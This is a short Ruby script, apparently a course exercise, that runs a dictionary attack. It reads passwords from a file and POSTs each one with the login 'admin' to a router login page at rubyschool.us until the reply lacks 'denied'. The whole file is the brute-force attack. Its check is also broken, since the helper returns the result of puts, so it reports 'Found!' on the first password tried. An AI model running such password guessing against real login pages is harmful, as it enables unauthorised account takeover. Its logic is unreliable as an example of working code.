require 'net/http'
require 'uri'

def is_wrong_password? password

uri = URI.parse 'http://rubyschool.us/router'
response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
puts response.include? "denied"

end


input = File.open "password.txt", "r"

while (line = input.gets)
	line.strip!
	print "Trying password #{line}... "

	if is_wrong_password? line
		puts "Error"
	else
		puts "Found!"
		input.close
		exit
	end
end